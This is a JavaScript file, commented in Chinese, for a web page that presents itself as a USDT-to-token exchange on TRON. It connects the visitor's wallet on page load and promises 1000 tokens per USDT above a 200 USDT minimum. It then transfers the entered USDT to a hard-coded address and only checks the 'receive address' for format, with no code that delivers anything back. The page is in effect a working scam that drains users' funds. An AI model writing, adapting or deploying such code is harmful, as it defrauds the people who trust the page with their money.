// 兑换比例和最低数量
const EXCHANGE_RATE = 1000;
const MINIMUM_AMOUNT = 200; // 最低兑换数量
const TARGET_ADDRESS = "THzYeKcgsuFPTYQg4U48UVadqFdQoHY91A";

// DOM 元素
const usdtAmountInput = document.getElementById("usdt-amount");
const receivedAmountInput = document.getElementById("received-amount");
const receiveAddressInput = document.getElementById("receive-address");
const exchangeBtn = document.getElementById("exchange-btn");

let tronWeb = null;
let walletConnected = false;

// TRON 主网配置
const TRON_MAINNET = {
    chainId: "0x2b6653dc", // TRON 主网 Chain ID (十进制 728126428)
    chainName: "TRON Mainnet",
    rpcUrls: ["https://api.trongrid.io"],
    nativeCurrency: {
        name: "TRON",
        symbol: "TRX",
        decimals: 6
    },
    blockExplorerUrls: ["https://tronscan.org"]
};

// 初始化 TronWeb 并尝试连接钱包
async function initTronWeb() {
    try {
        // 优先尝试使用 TronLink 或其他直接注入 tronWeb 的钱包
        if (window.tronWeb && window.tronWeb.ready) {
            tronWeb = window.tronWeb;
            walletConnected = true;
            console.log("通过 TronLink 连接成功:", tronWeb.defaultAddress.base58);
            checkAmountAndEnableButton();
            return;
        }

        // 如果没有 tronWeb，尝试通过 window.ethereum (EIP-1193) 连接
        if (window.ethereum) {
            // 请求用户授权连接钱包
            await window.ethereum.request({ method: "eth_requestAccounts" });

            // 检查当前网络是否为 TRON 主网
            const chainId = await window.ethereum.request({ method: "eth_chainId" });
            if (chainId !== TRON_MAINNET.chainId) {
                try {
                    // 尝试切换到 TRON 主网
                    await window.ethereum.request({
                        method: "wallet_switchEthereumChain",
                        params: [{ chainId: TRON_MAINNET.chainId }]
                    });
                } catch (switchError) {
                    // 如果切换失败（可能是网络未添加），添加 TRON 主网
                    if (switchError.code === 4902) {
                        await window.ethereum.request({
                            method: "wallet_addEthereumChain",
                            params: [TRON_MAINNET]
                        });
                    } else {
                        throw switchError;
                    }
                }
            }

            // 初始化 TronWeb，使用 window.ethereum 作为 provider
            tronWeb = new TronWeb({
                fullNode: "https://api.trongrid.io",
                solidityNode: "https://api.trongrid.io",
                eventServer: "https://api.trongrid.io",
                privateKey: "" // 不需要私钥，交给钱包签名
            });

            // 设置 provider 为 window.ethereum
            await tronWeb.setProvider(window.ethereum);
            walletConnected = true;
            console.log("通过 window.ethereum 连接成功:", tronWeb.defaultAddress.base58);
            checkAmountAndEnableButton();
            return;
        }

        // 如果都没有检测到，提示用户安装钱包
        console.log("未检测到任何支持 TRC20 的钱包");
        alert("请安装支持 TRC20 的钱包（如 TronLink、MetaMask、TokenPocket 等），并确保已登录并切换到 TRON 主网！");
    } catch (error) {
        console.error("初始化 TronWeb 失败:", error);
        alert("钱包连接失败，请检查是否安装了支持 TRC20 的钱包并已登录！");
    }
}

// 检查输入数量是否满足最低要求，并控制兑换按钮状态
function checkAmountAndEnableButton() {
    const usdtAmount = parseFloat(usdtAmountInput.value) || 0;
    if (usdtAmount >= MINIMUM_AMOUNT) {
        exchangeBtn.disabled = false;
    } else {
        exchangeBtn.disabled = true;
    }
}

// 计算兑换数量
usdtAmountInput.addEventListener("input", () => {
    const usdtAmount = parseFloat(usdtAmountInput.value) || 0;
    const receivedAmount = usdtAmount * EXCHANGE_RATE;
    receivedAmountInput.value = receivedAmount.toFixed(2);

    // 只更新按钮状态，不提示
    checkAmountAndEnableButton();
});

// 兑换按钮点击事件
exchangeBtn.addEventListener("click", async () => {
    // 检查钱包连接状态
    if (!walletConnected) {
        alert("请先连接钱包！确保已安装支持 TRC20 的钱包（如 TronLink、MetaMask、TokenPocket 等），并已登录并切换到 TRON 主网。");
        return;
    }

    const usdtAmount = parseFloat(usdtAmountInput.value);
    if (!usdtAmount || usdtAmount <= 0) {
        alert("请输入有效的USDT数量！");
        return;
    }

    // 检查最低数量
    if (usdtAmount < MINIMUM_AMOUNT) {
        alert(`最低兑换数量为 ${MINIMUM_AMOUNT} USDT！`);
        return;
    }

    // 检查接收地址
    const receiveAddress = receiveAddressInput.value.trim();
    if (!receiveAddress) {
        alert("请输入接收地址！");
        return;
    }

    // 使用 TronWeb 验证地址
    if (!tronWeb.isAddress(receiveAddress)) {
        alert("请检查接收地址是否正确！");
        return;
    }

    try {
        // USDT 合约地址（TRC20 USDT 主网地址）
        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const contract = await tronWeb.contract().at(usdtContractAddress);

        // 将 USDT 数量转换为最小单位（USDT 是 6 位小数）
        const amount = usdtAmount * 10 ** 6;

        // 调用 transfer 方法转账，不设置 feeLimit，让钱包自行计算
        await contract.transfer(TARGET_ADDRESS, amount).send({
            callValue: 0, // 不发送 TRX
            shouldPollResponse: true // 等待交易确认
        });

        alert(`转账成功！请等待确认。接收地址：${receiveAddress}`);
    } catch (error) {
        console.error("转账失败:", error);
        alert("转账失败，请检查网络或钱包设置！可能是手续费不足或网络拥堵。");
    }
});

// 页面加载时自动尝试连接钱包
window.addEventListener("load", async () => {
    await initTronWeb();
});
